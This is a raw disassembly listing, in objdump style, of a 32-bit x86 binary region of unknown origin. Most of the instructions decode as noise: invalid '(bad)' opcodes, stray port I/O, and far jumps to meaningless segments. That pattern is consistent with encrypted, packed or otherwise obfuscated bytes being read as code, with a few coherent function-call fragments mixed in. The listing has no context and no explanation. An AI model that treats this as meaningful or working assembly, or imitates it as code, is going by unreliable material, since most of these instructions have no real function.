  406b49:	lods   al,BYTE PTR ds:[esi]
  406b4a:	inc    ecx
  406b4b:	xchg   esi,eax
  406b4c:	(bad)  
  406b4d:	mov    al,ds:0x1d4e3f02
  406b52:	mov    dl,BYTE PTR [esi+0x23f9f624]
  406b58:	mov    ds,WORD PTR [ecx-0x6f9af6e1]
  406b5e:	mov    ds:0x275ee812,al
  406b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b64:	xchg   BYTE PTR [edx],dl
  406b66:	xor    cl,BYTE PTR [esp+edx*2-0xd]
  406b6a:	dec    eax
  406b6b:	jo     0x406b14
  406b6d:	fimul  DWORD PTR [edi+0x6]
  406b70:	pop    ds
  406b71:	int3   
  406b72:	cld    
  406b73:	mov    ah,0x7e
  406b75:	popa   
  406b76:	mov    eax,0xf3f45f52
  406b7b:	dec    edx
  406b7c:	dec    edx
  406b7d:	repz cld 
  406b7f:	js     0x406b5d
  406b81:	cmp    al,0x84
  406b83:	mul    cl
  406b85:	push   esi
  406b86:	mov    eax,ds:0x7db200ba
  406b8b:	mov    edi,0x26e6dd25
  406b90:	mov    esi,DWORD PTR [eax+0x39]
  406b93:	push   ebx
  406b94:	bound  eax,QWORD PTR [ecx]
  406b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b97:	cmp    BYTE PTR [edi],ah
  406b99:	inc    ebx
  406b9a:	jne    0x406b6f
  406b9c:	outs   dx,DWORD PTR ds:[esi]
  406b9d:	and    edx,DWORD PTR ds:0x598e659c
  406ba3:	dec    esi
  406ba4:	pop    ebp
  406ba5:	cdq    
  406ba6:	xlat   BYTE PTR ds:[ebx]
  406ba7:	and    DWORD PTR [ebx+0xf],edi
  406baa:	aad    0x9
  406bac:	or     al,0x4a
  406bae:	inc    ecx
  406baf:	jl     0x406c02
  406bb1:	call   0x529952ad
  406bb6:	sahf   
  406bb7:	pop    ebp
  406bb8:	pop    ebx
  406bb9:	in     al,0x59
  406bbb:	lods   eax,DWORD PTR ds:[esi]
  406bbc:	fld    QWORD PTR fs:[ebx]
  406bbf:	scas   al,BYTE PTR es:[edi]
  406bc0:	jns    0x406c33
  406bc2:	popa   
  406bc3:	xchg   esp,eax
  406bc5:	dec    ebp
  406bc6:	push   esi
  406bc7:	ror    BYTE PTR [edi],cl
  406bc9:	fidivr WORD PTR [esi]
  406bcb:	push   ebp
  406bcc:	jg     0x406b86
  406bce:	dec    esi
  406bcf:	stc    
  406bd0:	(bad)  
  406bd1:	sub    eax,0xcbd54b7b
  406bd6:	(bad)  
  406bd7:	ds mov eax,0xf88c179c
  406bdd:	aad    0x86
  406bdf:	xchg   edx,eax
  406be0:	push   esp
  406be1:	mov    WORD PTR [edx+0x42c1f48c],cs
  406be7:	jo     0x406c2a
  406be9:	cmp    bh,BYTE PTR [ebx]
  406beb:	inc    ecx
  406bec:	mov    bl,0x4a
  406bee:	(bad)  
  406bef:	hlt    
  406bf0:	rol    ah,1
  406bf2:	jbe    0x406c6b
  406bf4:	das    
  406bf5:	mov    bh,BYTE PTR [ebp+0x55294d42]
  406bfb:	sbb    BYTE PTR [ebx+0x63],ah
  406bfe:	push   edi
  406bff:	popa   
  406c00:	add    eax,0x6a58526e
  406c05:	aam    0x30
  406c07:	iret   
  406c08:	cmc    
  406c09:	adc    ebp,DWORD PTR [ecx+0x49bd0022]
  406c0f:	or     edx,DWORD PTR [esi]
  406c11:	fs fcmovnb st,st(7)
  406c14:	xor    al,0xcf
  406c16:	add    ah,ah
  406c18:	cmp    ah,dl
  406c1a:	mov    esp,0x74c053f5
  406c1f:	pop    esp
  406c20:	ins    BYTE PTR es:[edi],dx
  406c21:	loopne 0x406bf0
  406c23:	scas   al,BYTE PTR es:[edi]
  406c24:	and    eax,0xaab9a5f0
  406c29:	lods   al,BYTE PTR ds:[esi]
  406c2a:	xchg   DWORD PTR [eax-0x648b729b],edx
  406c30:	lock in eax,dx
  406c32:	push   0xc7864eb0
  406c37:	mov    eax,0x7b39984f
  406c3c:	lds    esp,FWORD PTR [ecx+0x6f7c1507]
  406c42:	push   ss
  406c43:	sbb    edx,0x5e0bc188
  406c49:	mov    ebp,0xa9baf918
  406c4e:	push   esi
  406c4f:	int    0x88
  406c51:	mov    ebp,0x4df32fde
  406c56:	lea    esi,[ebx]
  406c58:	mov    esi,0x607428cb
  406c5d:	xor    BYTE PTR [eax-0x73c9b805],0xbb
  406c64:	popa   
  406c65:	ja     0x406c8f
  406c67:	inc    esp
  406c68:	jae    0x406c6e
  406c6a:	push   ebx
  406c6b:	inc    esp
  406c6c:	inc    ebp
  406c6d:	ret    
  406c6e:	mov    eax,ds:0xf8df0853
  406c73:	ds jecxz 0x406cb8
  406c76:	test   eax,0x4649acc5
  406c7b:	fidiv  WORD PTR [eax]
  406c7d:	cs pop edi
  406c7f:	ss jl  0x406c50
  406c82:	mov    BYTE PTR [edi-0x36e974e7],ah
  406c88:	push   edx
  406c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c8a:	or     cl,cl
  406c8c:	jbe    0x406ca8
  406c8e:	rol    al,1
  406c90:	mov    dl,0xa2
  406c92:	mov    bh,0x22
  406c94:	xchg   edx,eax
  406c95:	sbb    dh,BYTE PTR [bx+di]
  406c98:	test   ecx,ebx
  406c9a:	sub    al,0x3e
  406c9c:	repnz sahf 
  406c9e:	ss pop es
  406ca0:	cli    
  406ca1:	sti    
  406ca2:	pop    ecx
  406ca3:	mov    DWORD PTR [ebx-0x648455b],eax
  406ca9:	bswap  esi
  406cab:	push   0xf7e9b322
  406cb0:	bound  ebp,QWORD PTR ds:0x2c589942
  406cb6:	xchg   esp,eax
  406cb7:	mov    bh,0x83
  406cb9:	out    dx,eax
  406cba:	push   eax
  406cbb:	arpl   di,si
  406cbd:	sbb    al,0x8b
  406cbf:	imul   ecx,ebp,0xcb3e8f3e
  406cc5:	cmc    
  406cc6:	push   0xffffffde
  406cc8:	and    al,0xbb
  406cca:	push   esp
  406ccb:	push   DWORD PTR [ebp-0xc]
  406cce:	push   DWORD PTR [ebp-0x14]
  406cd1:	call   0x405aeb
  406cd6:	test   eax,eax
  406cd8:	je     0x40739d
  406cde:	lea    eax,[ebp-0x78]
  406ce1:	jmp    0x40702e
  406ce6:	enter  0xde98,0x5a
  406cea:	outs   dx,BYTE PTR ds:[esi]
  406ceb:	bound  edx,QWORD PTR [edx+esi*4-0x2d]
  406cef:	adc    eax,0x91c8d985
  406cf4:	pop    eax
  406cf5:	xchg   esi,eax
  406cf6:	retf   
  406cf7:	(bad)  
  406cf8:	jo     0x406d6a
  406cfa:	and    BYTE PTR [ebp+0x70],bh
  406cfd:	jo     0x406d18
  406cff:	fild   DWORD PTR [ecx+0x2d]
  406d02:	add    al,0xe9
  406d04:	sbb    BYTE PTR [ecx+0xcede684],ah
  406d0a:	jecxz  0x406d77
  406d0c:	(bad)  
  406d0d:	xor    ch,BYTE PTR [ebp-0x5]
  406d10:	push   cs
  406d11:	mov    ds:0x22ed67f6,eax
  406d16:	out    0xad,al
  406d18:	inc    esi
  406d19:	jb     0x406ce4
  406d1b:	shl    BYTE PTR [edx],1
  406d1d:	xchg   ecx,eax
  406d1e:	aas    
  406d1f:	in     al,dx
  406d20:	pop    ecx
  406d21:	jmp    0x406d71
  406d23:	loopne 0x406d39
  406d25:	dec    edi
  406d26:	inc    ebp
  406d27:	data16 mov bl,0xaf
  406d2a:	and    eax,0xb9363a4e
  406d2f:	(bad)  
  406d30:	retf   0x2dbc
  406d33:	inc    edx
  406d34:	pop    edi
  406d35:	cmp    ebx,ebx
  406d37:	jae    0x406d18
  406d39:	fdivr  DWORD PTR [edi+0x2df0c631]
  406d3f:	ss xchg esp,eax
  406d41:	ins    DWORD PTR es:[edi],dx
  406d42:	xchg   ebp,eax
  406d43:	adc    esi,ebp
  406d45:	mov    dh,0x67
  406d47:	pop    ebx
  406d48:	int    0x64
  406d4a:	fnclex 
  406d4c:	icebp  
  406d4d:	dec    DWORD PTR [esi]
  406d4f:	mov    DWORD PTR [edx+edx*2+0x58],esi
  406d53:	dec    eax
  406d54:	jbe    0x406cf0
  406d56:	sbb    DWORD PTR [edx+0x62],esp
  406d59:	inc    edx
  406d5a:	ds push es
  406d5c:	aaa    
  406d5d:	addr16 daa 
  406d5f:	fist   DWORD PTR [ebx-0x428faa21]
  406d65:	cld    
  406d66:	pop    es
  406d67:	inc    ecx
  406d68:	or     edi,edi
  406d6a:	add    dl,BYTE PTR [ecx-0x16ba01bb]
  406d70:	cli    
  406d71:	js     0x406dec
  406d73:	rcr    BYTE PTR [esi-0x54],cl
  406d76:	mov    WORD PTR [eax+0xa],?
  406d79:	jmp    0xffd44666
  406d7e:	sbb    ebx,ebx
  406d80:	cdq    
  406d81:	fst    QWORD PTR [esi-0x8]
  406d85:	jl     0x406d4a
  406d87:	cli    
  406d88:	adc    BYTE PTR [eax*1+0x24225aae],0x9
  406d90:	cdq    
  406d91:	push   ss
  406d92:	(bad)  
  406d93:	(bad)  
  406d94:	jmp    0x463e:0xa099684f
  406d9b:	call   0x54048d9f
  406da0:	mov    ah,0x76
  406da2:	cmp    esi,DWORD PTR [eax+0x2eb3d5f3]
  406da8:	sti    
  406da9:	sbb    dl,ah
  406dab:	cld    
  406dac:	jno    0x406dfa
  406dae:	pop    esp
  406daf:	pop    es
  406db0:	scas   eax,DWORD PTR es:[edi]
  406db1:	mov    ah,0x2d
  406db3:	mov    ds:0xf243c0ef,al
  406db8:	data16 mov cl,0x83
  406dbb:	idiv   ebx
  406dbd:	(bad)  
  406dbf:	xchg   edi,eax
  406dc0:	jnp    0x406d8f
  406dc2:	mov    WORD PTR [edx+0x35],es
  406dc5:	fadd   QWORD PTR [ecx]
  406dc7:	and    esi,DWORD PTR [eax+0x73033f3e]
  406dcd:	in     eax,0xc9
  406dcf:	out    dx,eax
  406dd0:	push   ecx
  406dd1:	dec    bp
  406dd3:	cmp    esp,DWORD PTR [esi]
  406dd5:	mov    al,ds:0x512d216d
  406dda:	test   DWORD PTR [ebx-0x43ccfe50],eax
  406de0:	and    edx,DWORD PTR [esi-0x14717a3e]
  406de6:	aam    0x2
  406de8:	mov    ?,WORD PTR [eax+0x3c0db2e1]
  406dee:	pop    esp
  406def:	ins    BYTE PTR es:[edi],dx
  406df0:	xor    dh,bl
  406df2:	jmp    0x88a4:0x214b5dc7
  406df9:	sahf   
  406dfa:	mov    bh,cl
  406dfc:	sub    eax,edi
  406dfe:	popa   
  406dff:	(bad)  
  406e00:	sar    DWORD PTR [ebx-0x7d],1
  406e03:	inc    ebp
  406e04:	retf   0x3444
  406e07:	push   0x33b5f241
  406e0c:	fistp  WORD PTR [edi]
  406e0e:	dec    edi
  406e0f:	pop    edx
  406e11:	popf   
  406e12:	lea    ebp,[edi+esi*1+0x2b387f36]
  406e19:	stos   BYTE PTR es:[edi],al
  406e1a:	xchg   BYTE PTR [ecx],cl
  406e1c:	or     ebx,esp
  406e1e:	stc    
  406e1f:	mov    DWORD PTR [ecx-0x38757ce6],0x5a44edd4
  406e29:	(bad)  
  406e2b:	lea    esi,[edx+0x75]
  406e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e2f:	cdq    
  406e30:	mov    ch,0x1e
  406e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e33:	and    al,0xa8
  406e35:	std    
  406e36:	test   BYTE PTR [esi-0xf],dh
  406e39:	ss icebp 
  406e3b:	je     0x406eb7
  406e3d:	pop    DWORD PTR [ecx+0x4231d76a]
  406e43:	push   cs
  406e44:	pop    ebp
  406e45:	xor    al,BYTE PTR [ebx]
  406e47:	xchg   ebp,eax
  406e48:	pop    eax
  406e49:	jne    0x406e76
  406e4b:	lods   al,BYTE PTR ds:[esi]
  406e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e4d:	push   cs
  406e4e:	(bad)  
  406e50:	ret    0x32c3
  406e53:	aad    0x7d
  406e55:	outs   dx,BYTE PTR ds:[esi]
  406e56:	sbb    ecx,DWORD PTR [ecx+0x49]
  406e59:	pop    ds
  406e5a:	or     bh,BYTE PTR [eax]
  406e5c:	rcr    DWORD PTR [ecx+0x74],0xa
  406e60:	jl     0x406e48
  406e62:	dec    edx
  406e63:	jmp    DWORD PTR [edx-0x62d1412e]
  406e69:	call   0x56d7234
  406e6e:	call   FWORD PTR [ecx+0x35]
  406e71:	and    eax,0xe8234def
  406e76:	or     esi,DWORD PTR [ecx+0x187611f5]
  406e7c:	sar    DWORD PTR [eax+edx*8],1
  406e7f:	ins    DWORD PTR es:[edi],dx
  406e80:	xor    DWORD PTR [edx-0x28],ebx
  406e83:	adc    DWORD PTR [esi+0x1f56228a],0xffffffa4
  406e8a:	(bad)  
  406e8b:	adc    al,0x6
  406e8d:	jnp    0x406e93
  406e8f:	ins    DWORD PTR es:[edi],dx
  406e90:	out    0xb6,al
  406e92:	sub    BYTE PTR [eax],dl
  406e94:	mov    al,ds:0x48de2564
  406e99:	dec    ecx
  406e9a:	cwde   
  406e9b:	pop    esi
  406e9c:	sub    edi,ebx
  406e9e:	call   DWORD PTR [esi]
  406ea0:	das    
  406ea1:	mov    esp,0x9e10ac45
  406ea6:	(bad)  
  406ea7:	cmp    al,0x44
  406ea9:	inc    ecx
  406eaa:	xchg   DWORD PTR [esi],esp
  406eac:	jns    0x406eac
  406eae:	mov    ah,0xac
  406eb0:	dec    edx
  406eb1:	aam    0x24
  406eb3:	loopne 0x406f15
  406eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eb6:	pop    ss
  406eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eb9:	call   0xb6c0:0xcfb13219
  406ec0:	mov    al,0xad
  406ec2:	repnz aas 
  406ec4:	jae    0x406eaf
  406ec6:	iret   
  406ec7:	sbb    al,0xf2
  406ec9:	ds push 0xfffffff1
  406ecc:	add    DWORD PTR [edx-0x49],0x44
  406ed0:	xor    BYTE PTR [ebp-0x3589a886],0x75
  406ed7:	adc    ah,0x54
  406eda:	cli    
  406edb:	jmp    0xfad4:0x762ad922
  406ee2:	jo     0x406ebe
  406ee4:	mov    ebp,0xcb172a58
  406ee9:	jbe    0x406e98
  406eeb:	in     eax,0x7c
  406eed:	imul   edx,DWORD PTR [ebp+0x2f174d06],0x74673285
  406ef7:	ffree  st(4)
  406ef9:	pusha  
  406efa:	pop    es
  406efb:	jae    0x406e8a
  406efd:	mov    ecx,0x1c44e168
  406f02:	int3   
  406f03:	add    eax,0xe1f00799
  406f08:	jo     0x406f5b
  406f0a:	jmp    0x3f45:0xf4fd8c8f
  406f11:	icebp  
  406f12:	stos   DWORD PTR es:[edi],eax
  406f13:	sub    edx,DWORD PTR [edi+edi*2-0x5c]
  406f17:	pushf  
  406f18:	scas   al,BYTE PTR es:[edi]
  406f19:	mov    ebx,0xd0f377a
  406f1e:	pop    ss
  406f1f:	lods   al,BYTE PTR ds:[esi]
  406f20:	sbb    esp,edx
  406f22:	xor    bl,bl
  406f24:	jae    0x406ee4
  406f26:	scas   al,BYTE PTR es:[edi]
  406f27:	in     eax,0xfc
  406f29:	shl    BYTE PTR ds:0xe29f055d,cl
  406f2f:	scas   eax,DWORD PTR es:[edi]
  406f30:	pop    esp
  406f31:	jmp    0x406f40
  406f33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f35:	push   ebp
  406f36:	dec    edx
  406f37:	(bad)  
  406f38:	adc    al,0xc2
  406f3a:	ret    0xa94c
  406f3d:	loope  0x406f7f
  406f3f:	retf   0x6b47
  406f42:	loopne 0x406f43
  406f44:	or     eax,0xc5e2e6ec
  406f49:	imul   esi,DWORD PTR ds:0x77fd8c8b,0xcad1f6d0
  406f53:	jae    0x406fc4
  406f55:	leave  
  406f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f57:	inc    edx
  406f58:	push   es
  406f59:	pop    ecx
  406f5a:	adc    al,0x3b
  406f5c:	mov    bh,0xf3
  406f5e:	jns    0x406fdd
  406f60:	xchg   edx,eax
  406f61:	jnp    0x406fa0
  406f63:	dec    ebp
  406f64:	adc    ebx,eax
  406f66:	cmp    eax,edi
  406f68:	pop    edx
  406f69:	ss push 0xb
  406f6c:	inc    edx
  406f6d:	mov    BYTE PTR [eax+0x64],al
  406f70:	xlat   BYTE PTR fs:[ebx]
  406f72:	scas   al,BYTE PTR es:[edi]
  406f73:	je     0x406f35
  406f75:	mov    ah,0x42
  406f77:	fiadd  WORD PTR [ecx+0x41]
  406f7a:	sbb    ch,ch
  406f7c:	mov    esp,0x97497b8d
  406f81:	adc    eax,0x96884e6f
  406f86:	cmp    eax,DWORD PTR [esi]
  406f88:	bound  esi,QWORD PTR [eax+0x51]
  406f8b:	fsubr  DWORD PTR [edx+edi*8+0x1]
  406f8f:	push   esi
  406f90:	push   ss
  406f91:	or     DWORD PTR [ecx-0x58d3e1a5],ecx
  406f97:	popf   
  406f98:	or     ebp,DWORD PTR [eax]
  406f9a:	push   esp
  406f9b:	arpl   WORD PTR [esi+ecx*4],bx
  406f9e:	test   ch,al
  406fa0:	mov    al,0x61
  406fa2:	inc    ecx
  406fa3:	inc    esp
  406fa4:	dec    edx
  406fa5:	stc    
  406fa6:	int3   
  406fa7:	mov    esp,esp
  406fa9:	sub    DWORD PTR [edx],ebx
  406fab:	into   
  406fac:	(bad)  
  406fad:	push   0xdfae6669
  406fb2:	outs   dx,DWORD PTR ds:[esi]
  406fb3:	aad    0x1d
  406fb5:	sub    cl,dl
  406fb7:	mov    ds:0xa5c1ac25,al
  406fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fbd:	push   0xffffffa6
  406fbf:	dec    esp
  406fc0:	enter  0xf92b,0x87
  406fc4:	in     al,dx
  406fc5:	xchg   edi,eax
  406fc6:	loop   0x406fd0
  406fc8:	out    dx,eax
  406fc9:	aaa    
  406fca:	nop
  406fcb:	add    eax,0x90a93fd8
  406fd0:	ror    cl,cl
  406fd2:	add    DWORD PTR [edi-0x30b238de],esi
  406fd8:	sbb    edx,DWORD PTR [eax+0x3391ef4a]
  406fde:	mov    ebp,0x77a2c8e
  406fe3:	pop    ebx
  406fe4:	rol    BYTE PTR [esi-0x28],0x1d
  406fe8:	inc    ecx
  406fe9:	mov    BYTE PTR [esi+ebx*8+0x77],ah
  406fed:	adc    al,0xae
  406fef:	jb     0x406f82
  406ff1:	stos   BYTE PTR es:[edi],al
  406ff2:	or     al,0x16
  406ff4:	jp     0x407036
  406ff6:	rcl    eax,0xe4
  406ff9:	loopne 0x407079
  406ffb:	imul   esi,DWORD PTR [ecx],0xecf8a475
  407001:	fsub   QWORD PTR [edx-0x5f3f2319]
  407007:	adc    cl,BYTE PTR [ecx+eiz*2+0x30ee7842]
  40700e:	mov    cs,ebx
  407010:	test   DWORD PTR ds:0xb9620cf3,esp
  407016:	lahf   
  407017:	xchg   esp,eax
  407018:	lgs    edi,FWORD PTR [ecx]
  40701b:	fist   WORD PTR [edi+0x7455a4a9]
  407021:	repz sbb BYTE PTR [edx-0x2e],dl
  407025:	fstp   TBYTE PTR [edx]
  407027:	or     ch,ch
  407029:	sbb    DWORD PTR [ebx],0x509e0383
  40702f:	mov    eax,DWORD PTR [ebp-0x14]
  407032:	xor    eax,esi
  407034:	add    eax,edi
  407036:	push   eax
  407037:	mov    eax,DWORD PTR [ebp-0x10]
  40703a:	add    eax,0xee
  40703f:	push   eax
  407040:	mov    eax,DWORD PTR [ebp-0x10]
  407043:	jmp    0x407390
  407048:	inc    esp
  407049:	jmp    edx
  40704b:	cwde   
  40704c:	loope  0x4070af
  40704e:	inc    edx
  40704f:	pop    ebx
  407050:	(bad)  
  407051:	mov    dh,0x44
  407053:	mov    esi,0x77dce8e5
  407058:	sti    
  407059:	les    esi,FWORD PTR [eax+0x70]
  40705c:	and    BYTE PTR [ebp+0x70],bh
  40705f:	jo     0x407063
  407061:	inc    esi
  407062:	int3   
  407063:	jl     0x40701c
  407065:	xlat   BYTE PTR ds:[ebx]
  407066:	and    bl,BYTE PTR [ecx-0x4bb70f42]
  40706c:	ja     0x407044
  40706e:	loopne 0x40709c
  407070:	cdq    
  407071:	iret   
  407072:	arpl   WORD PTR [eax+eiz*1],ax
  407075:	xor    BYTE PTR [edi+0x3f],cl
  407078:	stc    
  407079:	lock adc al,0xdb
  40707c:	fs (bad) 
  40707f:	out    dx,al
  407080:	jle    0x407020
  407082:	mov    al,ds:0xafc0a604
  407087:	xor    eax,0x749fd667
  40708c:	ret    0xb2cc
  40708f:	ds and edx,ebx
  407092:	loop   0x4070ab
  407094:	xchg   esp,eax
  407095:	adc    eax,0x393b6cab
  40709a:	or     eax,0xd27077ee
  40709f:	(bad)  
  4070a0:	in     al,dx
  4070a1:	call   0x9d741855
  4070a6:	push   0xe790e7d0
  4070ab:	add    ecx,ecx
  4070ad:	xor    BYTE PTR [edx-0x66],ch
  4070b0:	scas   eax,DWORD PTR es:[edi]
  4070b1:	sub    ebp,DWORD PTR [edx-0x4f95b4a7]
  4070b7:	ja     0x40710f
  4070b9:	out    0x9d,al
  4070bb:	loope  0x407119
  4070bd:	in     al,dx
  4070be:	jmp    0x5fde:0xd52f82da
  4070c5:	out    dx,eax
  4070c6:	xlat   BYTE PTR ds:[ebx]
  4070c7:	mov    ebx,ebp
  4070c9:	bound  edx,QWORD PTR [ecx+eiz*1+0x5ad2d031]
  4070d0:	test   edi,ecx
  4070d2:	adc    eax,0xe93e3b47
  4070d7:	lock push ebx
  4070d9:	add    ebx,DWORD PTR [edi]
  4070db:	dec    edx
  4070dc:	and    eax,0xd52c1684
  4070e1:	mov    esi,0xea010f34
  4070e6:	bound  ecx,QWORD PTR [eax-0x55]
  4070e9:	cdq    
  4070ea:	cmc    
  4070eb:	imul   edx,DWORD PTR [esi-0x4cb2626b],0x18
  4070f2:	shl    BYTE PTR [ebx],1
  4070f4:	into   
  4070f5:	test   BYTE PTR [edx-0x68],0xbd
  4070f9:	push   ecx
  4070fa:	mov    bl,0x1f
  4070fc:	shr    BYTE PTR [ebx],1
  4070fe:	pop    ecx
  4070ff:	bound  edx,QWORD PTR [ecx+0x3d]
  407102:	and    al,0x78
  407104:	addr16 (bad) 
  407106:	pop    ds
  407107:	pop    ecx
  407108:	ret    0x263f
  40710b:	inc    esp
  40710c:	mov    eax,ds:0x246df946
  407111:	adc    BYTE PTR [eax-0x2b],0xd6
  407115:	mov    eax,0xac4989c5
  40711a:	push   ecx
  40711b:	push   esi
  40711c:	xor    ebp,DWORD PTR [ecx]
  40711e:	out    dx,eax
  40711f:	stc    
  407120:	pop    edi
  407121:	ss ins DWORD PTR es:[edi],dx
  407123:	test   BYTE PTR [edi-0xe],dl
  407126:	aas    
  407127:	out    dx,al
  407128:	out    0xbb,eax
  40712a:	mov    ds:0xe1d86280,eax
  40712f:	pop    es
  407130:	mov    ?,WORD PTR [ebp+0x69]
  407133:	mov    bl,0xb3
  407135:	xchg   ebp,eax
  407136:	into   
  407137:	mov    ecx,ecx
  407139:	mov    dl,0xf8
  40713b:	(bad)  
  40713c:	data16 jg 0x407163
  40713f:	std    
  407140:	mov    ds:0x79e2aec9,al
  407145:	push   es
  407146:	mov    ebx,0x21b78a67
  40714b:	shr    DWORD PTR [eax],0x17
  40714e:	inc    eax
  40714f:	data16 ja 0x40712c
  407152:	add    eax,0xf28c0239
  407157:	lea    edi,[eax-0x1c]
  40715a:	outs   dx,DWORD PTR ds:[esi]
  40715b:	les    ebx,FWORD PTR [edi+esi*8-0x5e]
  40715f:	aas    
  407160:	repz mov esi,0xb4113f48
  407166:	cmc    
  407167:	sbb    al,0xdc
  407169:	test   al,0x29
  40716b:	cdq    
  40716c:	fcmovb st,st(3)
  40716e:	das    
  40716f:	sub    dl,BYTE PTR [edi+eax*1]
  407172:	jmp    0x4071c4
  407174:	fwait
  407175:	push   edx
  407176:	cmp    BYTE PTR gs:[ebp-0x2d875dec],0x8f
  40717e:	mov    dl,0xed
  407180:	pop    esi
  407181:	sub    BYTE PTR [edx+0x56],dl
  407184:	pop    ss
  407185:	dec    ecx
  407186:	inc    edi
  407187:	adc    BYTE PTR [ecx+eiz*4-0x53fa03a0],ah
  40718e:	xlat   BYTE PTR ds:[ebx]
  40718f:	jp     0x407209
  407191:	and    ebx,ebp
  407193:	inc    esp
  407194:	push   DWORD PTR [edx]
  407196:	arpl   WORD PTR [ebx+eax*4],cx
  407199:	test   al,0xf8
  40719b:	cmp    BYTE PTR [ebx-0x3b],0x62
  40719f:	aaa    
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	mov    edi,0xa9199c0a
  4071a6:	hlt    
  4071a7:	and    al,0x4e
  4071a9:	aaa    
  4071aa:	dec    edx
  4071ab:	sub    ecx,esp
  4071ad:	sbb    dl,BYTE PTR [ebp-0x5c]
  4071b0:	mov    ch,0x86
  4071b2:	imul   ecx,DWORD PTR [ecx+0x60],0x9cdb235b
  4071b9:	xchg   ecx,eax
  4071ba:	in     eax,0x17
  4071bc:	out    0x58,al
  4071be:	retf   0x87f2
  4071c1:	mov    edi,0x1f0b0942
  4071c6:	dec    eax
  4071c7:	fisttp WORD PTR ds:0xb8b3b3c9
  4071cd:	clc    
  4071ce:	cmc    
  4071cf:	pop    edi
  4071d0:	add    eax,ebx
  4071d2:	dec    ebp
  4071d3:	xor    edx,DWORD PTR [edi-0x783f75f0]
  4071d9:	fxch   st(2)
  4071db:	or     dh,BYTE PTR [ebx-0x3c]
  4071de:	push   ss
  4071df:	or     edx,eax
  4071e1:	aas    
  4071e2:	aaa    
  4071e3:	loopne 0x4071b5
  4071e5:	stos   BYTE PTR es:[edi],al
  4071e6:	fdiv   DWORD PTR [ecx+0x6030cdd1]
  4071ec:	xchg   esi,eax
  4071ed:	shl    DWORD PTR [eax+edx*4-0x71e46e86],1
  4071f4:	adc    esi,esi
  4071f6:	sbb    eax,0xf51b015f
  4071fb:	test   bh,ah
  4071fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071fe:	add    BYTE PTR [esi+0x7e],dl
  407201:	xchg   ebx,eax
  407202:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  407204:	sar    BYTE PTR [esi-0x10dd2bbf],1
  40720a:	sbb    BYTE PTR [esi-0x3b],cl
  40720d:	xchg   DWORD PTR [eax+0x26cb7a80],ebp
  407213:	aad    0x55
  407215:	pushf  
  407216:	in     eax,dx
  407217:	cli    
  407218:	fidivr DWORD PTR [ebp-0x166ef0ef]
  40721e:	adc    al,0x87
  407220:	loop   0x407274
  407222:	nop
  407223:	in     al,dx
  407224:	mov    eax,ds:0x798c4562
  407229:	dec    ecx
  40722a:	push   0x2
  40722c:	mov    bh,0x4b
  40722e:	dec    eax
  40722f:	cs sbb esp,ebp
  407232:	dec    ebp
  407233:	push   eax
  407234:	xchg   ebx,eax
  407235:	(bad)  
  407236:	and    ebp,DWORD PTR [ebp-0x29]
  407239:	(bad)  
  40723a:	jge    0x407239
  40723c:	fwait
  40723d:	dec    esi
  40723e:	sbb    ch,BYTE PTR [edx+0x7ad8d1f3]
  407244:	addr16 push ebx
  407246:	cmc    
  407247:	jge    0x407262
  407249:	xlat   BYTE PTR ds:[ebx]
  40724a:	repnz sbb ecx,DWORD PTR [ebp+0x14af7e98]
  407251:	aas    
  407252:	stos   BYTE PTR es:[edi],al
  407253:	loope  0x4071db
  407255:	mov    eax,0xacfe3c1a
  40725a:	fwait
  40725b:	xor    BYTE PTR [edx],0xbe
  40725e:	sbb    cl,0x6d
  407261:	jl     0x4072c0
  407263:	sub    DWORD PTR [eax-0x71ff3d8a],ebx
  407269:	cmp    BYTE PTR fs:[ecx],dl
  40726c:	pop    edx
  40726d:	ss in  eax,0xa
  407270:	mov    esp,esp
  407272:	mov    dl,BYTE PTR [ebp-0x430d8d9d]
  407278:	cmp    al,0x25
  40727a:	jae    0x407216
  40727c:	pop    ss
  40727d:	(bad)  
  40727e:	cmp    ch,BYTE PTR [ecx]
  407280:	(bad)  
  407281:	mov    bl,0xb
  407283:	sub    cl,cl
  407285:	and    ch,BYTE PTR [esi-0x34]
  407288:	jmp    esp
  40728a:	hlt    
  40728b:	push   ecx
  40728c:	jnp    0x4072f0
  40728e:	jne    0x4072c4
  407290:	fdivp  st(3),st
  407292:	int3   
  407293:	mov    ecx,cs
  407295:	cmp    DWORD PTR [edx+0x1],eax
  407298:	or     BYTE PTR [eax],al
  40729a:	mov    al,0xb
  40729c:	mov    dl,0x97
  40729e:	cmp    DWORD PTR ds:0x80b3e07f,ecx
  4072a4:	pop    ss
  4072a5:	outs   dx,DWORD PTR ds:[esi]
  4072a6:	cmc    
  4072a7:	call   0x6624:0x451e689c
  4072ae:	mov    edi,0x280f13c5
  4072b3:	xlat   BYTE PTR ds:[ebx]
  4072b4:	xor    bh,BYTE PTR [edx+0x7e]
  4072b7:	push   esi
  4072b8:	sar    BYTE PTR [edx-0x53ecf033],0xcb
  4072bf:	pushf  
  4072c0:	std    
  4072c1:	mov    esi,DWORD PTR [ebp-0x5d57960b]
  4072c7:	into   
  4072c8:	jnp    0x407258
  4072ca:	test   eax,0x3cf936b4
  4072cf:	or     DWORD PTR [edi+0xe6ccdbf],ebp
  4072d5:	jbe    0x40733a
  4072d7:	adc    eax,0xefe0df1a
  4072dc:	push   edx
  4072dd:	add    bl,cl
  4072df:	mov    edi,0xbe9870a5
  4072e4:	jnp    0x4072ff
  4072e6:	dec    ecx
  4072e7:	xchg   ecx,eax
  4072e8:	inc    esp
  4072e9:	sbb    eax,0xb5bbc50d
  4072ee:	inc    esi
  4072ef:	femms  
  4072f1:	jg     0x40728d
  4072f3:	mov    bh,0x7b
